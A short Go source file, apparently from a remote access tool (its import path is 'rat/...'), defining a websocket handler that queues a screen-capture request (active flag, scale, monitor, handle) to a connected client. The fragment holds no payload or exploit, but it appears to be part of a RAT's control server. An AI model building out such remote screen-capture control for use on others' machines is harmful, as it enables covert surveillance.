package main

import (
	"rat/shared/network/header"

	"golang.org/x/net/websocket"
)

type ScreenUpdateMessage struct {
	Active  bool
	Scale   float32
	Monitor bool
	Handle_ int
}

func (m ScreenUpdateMessage) Handle(ws *websocket.Conn, client *Client) error {
	packet := ScreenPacket{
		Active:  m.Active,
		Scale:   m.Scale,
		Handle:  m.Handle_,
		Monitor: m.Monitor,
	}
	client.Listeners[header.ScreenHeader] = ws
	client.Queue <- &packet

	return nil
}
